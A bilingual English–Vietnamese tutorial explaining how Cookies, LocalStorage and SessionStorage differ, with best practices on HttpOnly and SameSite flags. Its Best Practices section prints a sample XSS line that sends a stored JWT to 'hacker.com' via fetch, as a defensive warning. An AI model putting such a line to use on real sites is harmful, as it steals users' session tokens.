# Web Storage: Cookies, LocalStorage, and SessionStorage

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

> **Tóm tắt**: Giao thức HTTP là phi trạng thái (Stateless) - nghĩa là Server bị "mất trí nhớ" tạm thời, nó không nhớ bạn là ai sau mỗi cú click chuột. Để giữ trạng thái đăng nhập hoặc giỏ hàng, Trình duyệt (Browser) phải cấp cho web một vài "ngăn kéo" để cất giữ thông tin cục bộ trên máy tính của bạn. 3 ngăn kéo phổ biến nhất là **Cookies**, **LocalStorage**, và **SessionStorage**.

</details>

> **Summary**: The core HTTP protocol is strictly stateless. By default, a web server suffers from complete amnesia; it has absolutely no memory of your previous requests. To maintain a stateful experience (e.g., staying logged in, keeping items in a shopping cart), the web relies on Client-Side Storage architectures. The Browser provides isolated storage lockers on the user's hard drive—namely **Cookies**, **LocalStorage**, and **SessionStorage**—to persist this critical context.

---

## ELI5 (Explain Like I'm 5)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Hãy tưởng tượng bạn đi siêu thị (Trang web) và gửi đồ ở quầy giữ đồ.
- **Session Storage (Tủ gửi đồ tạm thời)**: Chỉ dùng được trong lúc bạn đang ở siêu thị. Bạn bước ra khỏi cửa (Đóng tab trình duyệt) là bảo vệ vứt hết đồ đi.
- **Local Storage (Tủ đồ thuê bao tháng)**: Bạn thuê một cái tủ. Đồ của bạn cứ nằm đó vĩnh viễn, tháng sau quay lại vẫn còn (Đóng/mở máy tính thoải mái). Siêu thị không thèm quản lý cái tủ này.
- **Cookies (Cái thẻ tên trên ngực)**: Bạn dán một cái thẻ tên trên ngực. Cứ mỗi lần bạn mua 1 món đồ, bạn tự động chìa cái thẻ đó ra cho thu ngân xem. Siêu thị biết chính xác bạn là ai ở mọi quầy hàng.

</details>

Imagine visiting a massive amusement park (The Web Application).
- **SessionStorage (A temporary day-locker)**: You rent it for the day. The moment you leave the park and walk out the exit gates (closing the browser tab), security throws all your items into the incinerator. 
- **LocalStorage (A permanent safety deposit box)**: You own this box indefinitely. You can leave the park, turn off your car, come back three months later, and your items are exactly where you left them. The park staff does not proactively check this box.
- **Cookies (A VIP wristband)**: You strap a wristband to your arm. Every single time you approach a ride or buy a hotdog, the park staff physically inspects your wristband. It automatically identifies you everywhere you go within the park boundaries.

---

## Layer 1: What is it? (What)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

Cả 3 đều là nơi lưu trữ Text (String) trên trình duyệt, nhưng cơ chế hoàn toàn khác nhau:
1. **Cookies**: Cực kỳ nhỏ (Tối đa 4KB). Tuyệt chiêu của nó là: **Tự động bay theo mọi Request**. Cứ mỗi lần bạn gửi lệnh lên Server, trình duyệt sẽ tự động bứng cái Cookie nhét vào gói tin HTTP. Server dựa vào đó để biết bạn là ai.
2. **LocalStorage**: Rộng rãi hơn (Khoảng 5MB). Dữ liệu nằm ở máy tính bạn vĩnh viễn (cho tới khi bạn tự bấm nút Xóa). Trình duyệt KHÔNG tự động gửi LocalStorage lên Server. JS phải tự đọc ra rồi ghép vào API.
3. **SessionStorage**: Giống y hệt LocalStorage, nhưng vòng đời siêu ngắn. Nó chỉ sống trong đúng cái Tab (cửa sổ) đang mở. Đóng Tab là dữ liệu bốc hơi.

</details>

All three are web APIs facilitating Key-Value String storage on the client's machine, differentiated strictly by capacity, lifespan, and network behavior:
1. **Cookies**: Severely capacity-restricted (Maximum 4KB). Its defining architectural trait is **Automatic Network Transmission**. Every single HTTP request emitted to the associated domain will automatically physically attach the Cookie payload in the HTTP Headers. This is the backbone of web authentication.
2. **LocalStorage**: Generous capacity (~5MB per domain). Provides persistent storage. Data survives browser restarts and OS reboots. Crucially, the browser does *not* automatically transmit this data over the network. Frontend Javascript must manually read it.
3. **SessionStorage**: Identical API to LocalStorage, but tethered to a strictly ephemeral lifespan. The data exists exclusively within the context of a single Browser Tab. Closing the tab immediately triggers garbage collection, destroying the data.

---

## Layer 2: Why does it exist? (Why)

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

- **Cookies sinh ra để Định danh (Authentication)**: HTTP không có tính năng đăng nhập. Server bắt buộc phải dựa vào một chuỗi mã bí mật (Session ID / Token) nằm trong Cookie để biết bạn là Admin hay User thường.
- **LocalStorage sinh ra để làm Cache**: Mỗi lần vào trang web lại phải tải cái Menu cấu hình, mã màu Theme (Dark/Light mode). Việc này quá tốn mạng. Ta tải 1 lần rồi nhét vào LocalStorage, lần sau web mượt như app offline.
- **SessionStorage sinh ra cho Form đa trang**: Khi bạn điền Form mua hàng dài 3 trang (Step 1 -> Step 2 -> Step 3). Nếu lỡ bấm F5 (Refresh), SessionStorage giữ lại dữ liệu điền dở để bạn không phát điên vì phải gõ lại.

</details>

- **Cookies exist for Authentication and Statefulness**: Because HTTP is inherently amnesiac, servers require an unforgeable cryptographic stamp (a Session ID or JWT) presented on *every* request to authorize protected routes. Cookies automate this mechanical presentation flawlessly.
- **LocalStorage exists for Client-Side Caching**: Redownloading static User Preferences (e.g., Theme configuration `{"theme": "dark"}`, UI layouts, offline draft data) is a catastrophic waste of network bandwidth. LocalStorage caches this persistently, enabling Progressive Web Apps (PWAs) to boot up instantly offline.
- **SessionStorage exists for Multi-step Form State**: When a user navigates a massive 5-step Checkout Form wizard, executing a page refresh (F5) would violently erase all input memory. SessionStorage temporarily buffers this transient state, surviving reloads, but gracefully destroying itself once the checkout tab is closed to prevent stale data contamination.

---

## Layer 3: Without vs. With Comparison (Compare)

### Storage Matrix Comparison

| Feature | Cookies | LocalStorage | SessionStorage |
|---|---|---|---|
| **Capacity** | ~4 KB | ~5 MB | ~5 MB |
| **Lifespan** | Configurable (Expires header) | Permanent (Until deleted) | Ephemeral (Until Tab closes) |
| **Auto-sent to Server?** | **YES** (On every HTTP Request) | **NO** | **NO** |
| **Accessibility (JS)**| Yes (Unless `HttpOnly` is set) | Yes | Yes |
| **Primary Use Case** | Session IDs, JWT Auth Tokens | UI Themes, Offline Cache | Form drafts, Tab-specific state |

---

## Layer 4: Common Use Cases

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

- **Cookies bảo mật (`HttpOnly`)**: Dùng để cất giữ JWT Token (Chìa khóa đăng nhập). Khi cấu hình `HttpOnly`, Hacker dùng Javascript (Lỗi XSS) sẽ KHÔNG THỂ NÀO đọc được Cookie này. Cực kỳ an toàn!
- **LocalStorage**: Lưu giữ giỏ hàng ẩn danh (Khách chưa đăng nhập nhưng cứ bấm Mua Hàng). Lưu trạng thái người dùng (Đã bấm Tắt cái popup Quảng cáo rồi thì đừng hiện lại nữa).
- **SessionStorage**: Lưu lại trạng thái của bộ lọc tìm kiếm (Filter). Khi chuyển sang xem chi tiết sản phẩm rồi bấm "Back" lại, danh sách cũ vẫn còn nguyên không bị mất filter.

</details>

- **Hardened Cookies (`HttpOnly` Flag)**: The undisputed standard for storing highly sensitive Authentication Tokens (JWTs or Session IDs). Applying the `HttpOnly` flag physically blocks the browser's JavaScript engine from reading the Cookie. This completely neutralizes catastrophic XSS (Cross-Site Scripting) token theft attacks.
- **LocalStorage**: Storing Anonymous Shopping Carts (persisting items before the user creates an account). Caching UI dismissal states (e.g., "User clicked 'Don't show this popup again', save a `popup_dismissed: true` flag permanently").
- **SessionStorage**: Preserving heavy Search Filter configurations. When a user applies 5 complex filters on an e-commerce grid, clicks an item, and hits the browser "Back" button, SessionStorage restores the filters perfectly, preventing user frustration.

---

## Layer 5: Deep Practice

### Best Practices

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

1. **Tuyệt đối không lưu Token Auth vào LocalStorage**: Nếu trang web của bạn bị nhiễm mã độc XSS (Hacker chèn được thẻ `<script>` vào web), đoạn script đó chỉ cần gõ lệnh `localStorage.getItem('token')` là lấy được chìa khóa nhà của bạn và gửi về máy chủ của chúng. Đăng nhập BẮT BUỘC dùng Cookie có cờ `HttpOnly`.
2. **JSON.stringify()**: LocalStorage chỉ lưu được Chữ (String). Đừng lỡ dại lưu nguyên cục Object `localStorage.setItem('user', {name: "A"})`, kết quả lưu xuống sẽ bị biến thành rác `[object Object]`. Hãy luôn dùng `JSON.stringify()` khi lưu và `JSON.parse()` khi đọc ra.

</details>

1. **Never store Authentication Tokens in LocalStorage**: LocalStorage provides zero cryptographic security. It is fully exposed to the global `window` object. If your site suffers a single XSS vulnerability (e.g., rendering un-sanitized user comments containing `<script>` tags), the malicious script will simply execute `fetch('hacker.com?token=' + localStorage.getItem('jwt'))`. Your entire userbase is compromised. **Always use `HttpOnly` Cookies for Auth**.
2. **Serialization is Mandatory**: The Storage API strictly accepts Strings. Attempting to write a raw Javascript object `localStorage.setItem('config', { theme: 'dark' })` will invoke the default `.toString()` method, permanently corrupting the storage with the useless string `"[object Object]"`. You must rigorously wrap payloads in `JSON.stringify()` for writing, and `JSON.parse()` for reading.

### Common Pitfalls

<details>
<summary>🇻🇳 <b>Hiển thị bản dịch Tiếng Việt</b></summary>
<br>

1. **Dùng Cookie làm kho chứa đồ**: Cứ nhét bừa dữ liệu (Ví dụ: Lịch sử click chuột) vào Cookie. Bạn quên mất rằng Cookie TỰ ĐỘNG BAY lơ lửng trên mạng. Cứ mỗi lần tải 1 tấm ảnh, trình duyệt lại cõng thêm 4KB rác rưởi gửi lên Server. Gây nghẽn mạng nghiêm trọng! Dữ liệu rác phải vứt vào LocalStorage.
2. **Lỗi CSRF (Cross-Site Request Forgery) trên Cookie**: Mặc dù Cookie `HttpOnly` chống được XSS, nhưng nó lại dính đòn CSRF. Hacker lừa user bấm vào một nút bên trang web giả mạo, trình duyệt thấy gọi API sang Server xịn nên TỰ ĐỘNG đính kèm Cookie đăng nhập vào. (Cách giải quyết: Bật cờ `SameSite=Strict` trên Cookie).

</details>

1. **Cookie Payload Bloat**: Misunderstanding the automatic transmission nature of Cookies. If a Junior developer utilizes a Cookie to store a 3KB JSON blob of "User UI Preferences", that exact 3KB blob is violently attached to *every single HTTP request*, including requests for tiny `favicon.ico` or CSS files. This massive overhead throttles bandwidth. Purely client-side data must be quarantined in LocalStorage.
2. **The CSRF Vulnerability (Cross-Site Request Forgery)**: While `HttpOnly` Cookies defeat XSS, they are highly vulnerable to CSRF. Because the browser blindly attaches the Cookie to any outgoing request to the target domain, a Hacker can build an evil website with a hidden form pointing to your Bank's `/transfer_money` endpoint. If the user visits the evil site while logged into the Bank, the browser executes the attack using the victim's valid Cookie. **Solution**: Strictly enforce the `SameSite=Lax` or `SameSite=Strict` attribute on the Auth Cookie.

---

## Related Topics

- To understand how Hackers steal this storage, see **[Web Security](../security/web-security.md)**.
- To see how the browser physically transmits Cookies, review **[HTTP & HTTPS](../network/http-https.md)**.
- See how JSON is serialized before entering storage in **[Data Formats](./data-formats.md)**.
